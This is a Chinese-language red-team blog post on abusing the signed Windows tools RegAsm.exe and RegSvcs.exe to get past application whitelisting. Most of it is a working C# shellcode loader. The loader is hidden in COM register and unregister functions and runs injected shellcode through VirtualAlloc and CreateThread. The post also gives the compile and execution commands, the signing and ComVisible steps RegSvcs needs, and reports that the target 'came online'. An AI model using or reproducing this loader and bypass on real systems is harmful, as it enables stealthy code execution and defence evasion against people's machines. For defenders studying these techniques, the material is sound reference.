---
layout:     post
title:    白名单-RegAsm/RegSvcs的利用
subtitle:   RegAsm/RegSvcs的利用
date:       2020-02-03
author:     hmoytx
header-img: img/bg_02.jpg
catalog: true
tags:
    - 白名单
    - 红队
    - 内网渗透
---
# 白名单-RegAsm/RegSvcs的利用

## 简介

RegAsm读取程序集中的元数据，并将所需项添加到注册表中。注册表允许 COM 客户端以透明方式创建 .NET Framework 类。 在注册一个类之后，任何 COM 客户端都可以像使用 COM 类一样使用它。 类仅在安装程序集时注册一次。 只有实际注册程序集中的类实例之后才能从 COM 中创建它们。  
.NET 服务安装工具RegSvcs执行下列操作：
- 加载并注册程序集。
- 生成、注册类型库并将其安装到指定的 COM+ 应用程序中。
- 配置以编程方式添加到类的服务。

因为同样是没有添加到PATH中，需要给上绝对路径。  
win7为例：***C:\Windows\Microsoft.NET\Framework\v4.0.30319***
具体的一些介绍信息可以查看官方手册。  
[https://docs.microsoft.com/zh-cn/dotnet/framework/tools/regasm-exe-assembly-registration-tool](https://docs.microsoft.com/zh-cn/dotnet/framework/tools/regasm-exe-assembly-registration-tool)   
[https://docs.microsoft.com/zh-cn/dotnet/framework/tools/regsvcs-exe-net-services-installation-tool](https://docs.microsoft.com/zh-cn/dotnet/framework/tools/regsvcs-exe-net-services-installation-tool)   

### RegAsm测试
跟前面的InstallUtil有点像，只是文件代码需要改下，且要编译成dll文件。  
```
using System;
using System.IO;
using System.Collections.Generic;
using System.Text;
using System.Threading.Tasks;
using System.EnterpriseService;
using System.Runtime.InteropServices;


namespace sdwjSJdn
{

    public class sSDMWo:ServicedComponent
    {
        public  void SDnqsdS()
        {
            Console.WriteLine("test");
        }
        [ComRegisterFunction]
        public static void RegisterClass(string SDJLNWdws)
        {
        shellcodeload.MsdwsdSAsdw();
        }
        [ComUnregisterFunction]
        public static void UnRegisterClass(string SDJLNWdws)
        {
        shellcodeload.MsdwsdSAsdw();
        }
    public class shellcodeload
    {
        public static void MsdwsdSAsdw()
        {
            byte[] shellcode = new byte[] { .......... }; //添加要加载的shellcode
            
            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
            Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
            IntPtr hThread = IntPtr.Zero;
            UInt32 threadId = 0;

            // Prepare data
            IntPtr pinfo = IntPtr.Zero;

            // Invoke the shellcode
            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
            WaitForSingleObject(hThread, 0xFFFFFFFF);
            return;
        }

        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;

        [DllImport("kernel32")]
        private static extern UInt32 VirtualAlloc(
            UInt32 lpStartAddr,
            UInt32 size,
            UInt32 flAllocationType,
            UInt32 flProtect
        );

        [DllImport("kernel32")]
        private static extern IntPtr CreateThread(
            UInt32 lpThreadAttributes,
            UInt32 dwStackSize,
            UInt32 lpStartAddress,
            IntPtr param,
            UInt32 dwCreationFlags,
            ref UInt32 lpThreadId
        );

        [DllImport("kernel32")]
        private static extern UInt32 WaitForSingleObject(
            IntPtr hHandle,
            UInt32 dwMilliseconds
        );
    }
}
```
然后直接编译：  
```
csc.exe /target:library /out:test.dll 1.cs
```
建议将得到的dll放到.net目录下，然后执行。  
```
RegAsm.exe /U test.dll
```
可以看到上线了。  
![200203_1](/img/200203_regasm.png)  


### RegSvcs测试
代码还是用上面的代码，但是两个问题，一个是要给dll签名，一个是要修改一个配置。  
创建强名称密钥文件：  
打开开发人员命令提示。  
像下面一样创建密钥文件。  
![200203_2](/img/200203_snk.png)  
然后在项目属性中添加这个文件。  
![200203_3](/img/200203_addsnk.png)  
这样编译还是不能运行，会报类错误的。  
修改项目中的AssemblyInfo.cs文件，将[assembly: ComVisible(false)]改为true。  
![200203_4](/img/200203_asminfo.png)  
然后编译成dll文件。  
放到.net目录下执行。  
```
RegSvcs.exe test.dll
```
![200203_5](/img/200203_regsvcs.png)  



### 参考
[https://micro8.github.io/Micro8-HTML/Chapter1/71-80/73_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E4%B8%89%E5%AD%A3.html](https://micro8.github.io/Micro8-HTML/Chapter1/71-80/73_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E4%B8%89%E5%AD%A3.html)  
[https://micro8.github.io/Micro8-HTML/Chapter1/71-80/74_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95regsvcs.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%9B%9B%E5%AD%A3.html](https://micro8.github.io/Micro8-HTML/Chapter1/71-80/74_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95regsvcs.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%9B%9B%E5%AD%A3.html)  




